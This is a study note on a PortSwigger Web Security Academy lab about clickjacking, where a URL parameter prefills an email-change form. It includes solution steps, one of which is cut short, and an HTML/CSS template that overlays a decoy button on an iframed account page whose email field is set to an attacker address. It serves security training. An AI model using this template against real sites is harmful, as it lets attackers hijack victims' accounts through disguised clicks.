# Lab: Clickjacking with form input data prefilled from a URL parameter

**Official PortSwigger URL:** https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input

## Lab idea

This challenge extends a basic clickjacking scenario by using URL-provided data to prepopulate an account form before the user interacts with it. It practices recognizing how prefilled form state can affect the consequences of an induced click.

## Vulnerability in brief
Clickjacking, also called **UI redressing** (user-interface redressing), is an interface-based attack in which a person is tricked into activating a control on a hidden website while believing they are clicking something else on a decoy page. A common mechanism is to place a target page inside an iframe and layer the decoy content over it. Layout, stacking order, and transparency can make an actionable target control line up with the apparent decoy control. The click is still a real user action within the target site's authenticated session.

## Solution idea
1. Log in to the account on the target website.
2. Go to the exploit server and paste the following HTML template into the "Body" section: <style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity…
3. Make the following adjustments to the template:
4. Click Store and then View exploit .
5. Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly.
6. Once you have the div element lined up correctly, change "Test me" to "Click me" and click Store .
7. Change the email address in your exploit so that it doesn't match your own.
8. Deliver the exploit to the victim to solve the lab.

## Payloads / key values
- `<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`
- `YOUR-LAB-ID`
- `$height_value`
- `$width_value`
- `$top_value`
- `$side_value`
- `$opacity`

## Official source
- [PortSwigger Academy: Lab: Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)
